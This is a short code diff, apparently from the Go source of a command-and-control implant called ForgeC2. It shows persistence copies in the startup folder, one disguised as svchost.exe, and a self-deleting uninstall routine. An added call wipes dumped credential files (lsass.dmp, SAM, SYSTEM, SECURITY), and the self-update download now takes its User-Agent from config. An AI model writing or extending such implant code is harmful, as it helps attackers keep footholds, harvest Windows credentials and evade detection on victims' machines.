@@ -50,6 +50,9 @@ func uninstallSelf() (string, error) {
 		for _, name := range []string{"forgec2.exe", "svchost.exe", "ForgeC2.exe"} {
 			os.Remove(filepath.Join(startupDir, name))
 		}
+		// Scrub dumped credential material (lsass.dmp / SAM / SYSTEM / SECURITY)
+		// so a removed implant does not leave the crown jewels on disk.
+		cleanupCredDumpFiles()
 	}
 	// delete self file (best effort)
 	exe, _ := os.Executable()
@@ -126,7 +129,7 @@ func selfUpdate(cmdJSON string) string {
 		os.Remove(tmpPath)
 		return "failed to create request: " + err.Error()
 	}
-	httpReq.Header.Set("User-Agent", UserAgent)
+	httpReq.Header.Set("User-Agent", getActiveUserAgentFromConfig())
 	httpReq.Header.Set("Content-Type", "application/octet-stream")
 
 	resp, err := client.Do(httpReq)
